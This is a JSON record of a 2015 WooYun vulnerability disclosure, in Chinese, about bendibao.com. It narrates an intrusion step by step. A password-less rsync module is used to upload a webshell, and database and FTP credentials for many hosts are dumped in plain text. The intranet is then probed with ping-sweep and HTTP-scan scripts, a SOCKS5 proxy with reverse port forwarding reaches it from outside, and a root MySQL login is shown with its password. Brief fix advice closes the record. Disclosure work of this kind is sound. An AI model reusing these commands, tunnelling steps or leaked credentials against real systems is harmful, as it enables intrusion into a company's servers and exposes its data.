{"id": 69483, "wybug_id": "wooyun-2015-0146277", "wybug_title": "本地宝某处漏洞导致内网漫游(涉及数据库及大量源码)", "wybug_corp": "bendibao.com", "wybug_author": "1c3z", "wybug_date": "2015-10-13 10:09", "wybug_open_date": "2015-10-18 10:10", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["默认配置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 库太多，不知道有多少用户。 详细说明：  rsync www.bendibao.com::\n\n然后找个有写权限的目录把马传上去rsync -av 1.php www.bendibao.com::webshequ/test/http://shequ.sz.bendibao.com/test/1.php 密码aa分站太多了。。\n\n收集下数据库的信息：这里只是一小部分。。/web/shequ/config/config_global.php$_config['db']['1']['dbhost'] = '192.168.1.200';$_config['db']['1']['dbuser'] = 'bdbshequ';$_config['db']['1']['dbpw'] = '25411982';/web/shequ/config/config_global.phparray (    'host' => '192.168.1.110',    'user' => 'xmbdbinfo_user',    'pass' => 'v6fhC69GZFTPXnxu',    'name' => 'tybdbinfo',  ),  'dz_db' =>   array (    'host' => '192.168.1.110',    'user' => 'whbdbinfo_db',    'pass' => 'DS7uQMvPT2TT3rWf',    'name' => 'dazhe',  ),/web/wulumuqi/config/system.php$INI = array (  'db' =>   array (    'host' => '192.168.1.110',    'user' => 'waidibdb_usr',    'pass' => 'FqmbbSBCdtPyM8Cc',    'name' => 'wlmqbdbinfo',  ),/web/chengdu/config/system.php  'db' =>   array (    'host' => '192.168.1.110',    'user' => 'cdbdbinfo_db',    'pass' => 'mtQneVBfCTGcySSH',    'name' => 'cdbdbinfo',  ),  'db2' =>   array (    'host' => '192.168.1.110',    'user' => 'whbdbinfo_db',    'pass' => 'DS7uQMvPT2TT3rWf',    'name' => 'postcode',  ),/web/www/config/config_global.php$_config['db']['1']['dbhost'] = '192.168.1.107';$_config['db']['1']['dbuser'] = 'bdbshequ';$_config['db']['1']['dbpw'] = '25411982';$_config['db']['1']['dbcharset'] = 'utf8';$_config['db']['1']['pconnect'] = '0';$_config['db']['1']['dbname'] = 'bdbshequ';$_config['db']['1']['tablepre'] = 'shequ';/web/wap/touch/config/sz.php'db'=>array(        'host'=> '183.60.137.14,2433',         'user'=> 'wsl@bendibao.com',           'password'=> 'wsl@bdb',        'name'=> 'szadinfo',        'provider'=> 'mssql',/web/wap/touch/config/wh.php'db'=>array(        'host'=> '183.60.137.17',         'user'=> 'whbdbinfo_db',           'password'=> 'DS7uQMvPT2TT3rWf',        'name'=> 'whbdbinfo',        'provider'=> 'mysql',    ),/web/waidiwap/config/qth_config.php$INI = array (  'db' =>   array (    'host' => '192.168.1.200',    'user' => 'qthbdbinfo_db',    'pass' => 'xDzQ6T1h3I2h4SsM',    'name' => 'qthbdbinfo',  ),);ftp用户名密码：/etc/vsftpd/vuser_passwd.txt 奇行是用户名，偶行是密码jiahai12jiahai2541jiahaijiahai#2541xiaoheixiaohei#2541wuslwsl@bdb.2541yudingyuding@bdbhansenhswhansen77loutongwhloutong#3657@hswloutongcdloutong#3657@hswhaitunhaitun#ht通关命令netstat -an，发现与内网连接的机子192.168.1.200:3306 192.168.1.201:3306192.168.1.110:11211 192.168.1.107:3306发现一个通用用户名密码 bdbshequ 25411982菜刀连上，发现都长的差不多，400多个库\n\n数据库用户也这么多\n\n内网探测下存活主机，扫描有点慢。。\nbash pingall.sh  192.168.1 1 255 > host.txt//pingall.sh #!/bin/bashfor i in `seq ${2} ${3}`do    ping -c 1 ${1}.${i} > /dev/null 2>&1    if [ $? -eq 0 ]; then        echo \"${1}.${i}\"    fidone\n存活主机\n192.168.1.101192.168.1.102192.168.1.103192.168.1.104192.168.1.105192.168.1.106192.168.1.107192.168.1.108192.168.1.109192.168.1.110192.168.1.112192.168.1.168192.168.1.200192.168.1.201\n扫下http服务\nimport urllib2from multiprocessing.dummy import Pool as ThreadPoolimport socketsocket.setdefaulttimeout(5)def have_http(host):    host = host.strip().rstrip('/')    print host    ports = ['80','81','82','83','8080','8081','9090','9092','8888','88','8083']    for port in ports:        url = 'http://' + host +\":\" +port +'/'        try:            text = urllib2.urlopen(url).read()            if '<' in text:                file('have_http','a').write(url + '\\n')        except Exception, e:            passdef poc(fun,name='host'):    pool = ThreadPool(10)    targets = file(name)    pool.map(fun, targets)    pool.close()     pool.join()if __name__ == '__main__':    poc(have_http)\n\nhttp://192.168.1.109:80/http://192.168.1.106:8080/http://192.168.1.168:80/http://192.168.1.110:8080/http://192.168.1.107:8080/http://192.168.1.200:8080/\n后来测试了下，也就上面跑着一个管理系统，http://192.168.1.168:80/。但是在我这边看起来是坏的。。接下来端口扫描，但是我没扫。。插入内网。。在内网开个socks5的服务https://gist.github.com/yaonie/2490851然后用portmap，做端口转发，反弹出来。虽然主机有公网IP，但是好像有墙。内网机子 python s5.py 8282再公网主机执行，./portmap -m 2 -p1 2222  -p2 2223内网，./portmap -m 3 -h1 公网IP -p1 2222 -h2 127.0.0.1 -p2 8282然后就有了个监听在2223的socks5的服务\n\n配置下proxychains-ngmemcached\n\nrsync  竟然没权限\n\nrsync数据库备份信息\n\n\n\n\n\n\n\nftp 匿名账号\n\nftp ，利用前面收集的信息登录\n\n\n\n在shell脚本中翻到另一台mysql主机proxychains4 mysql -h183.60.137.94 -uroot -pbdb#jiahai2541\n\nrsync 183.60.137.17::另一台公网中的rsync\n\n   漏洞证明：  如上   修复方案：  1.不用使用同一个密码2.rsync要配置密码，最好限制下ip3.子站子间要隔离好，不然容易一锅端   版权声明：转载请注明来源 1c3z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-10-18 10:10 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}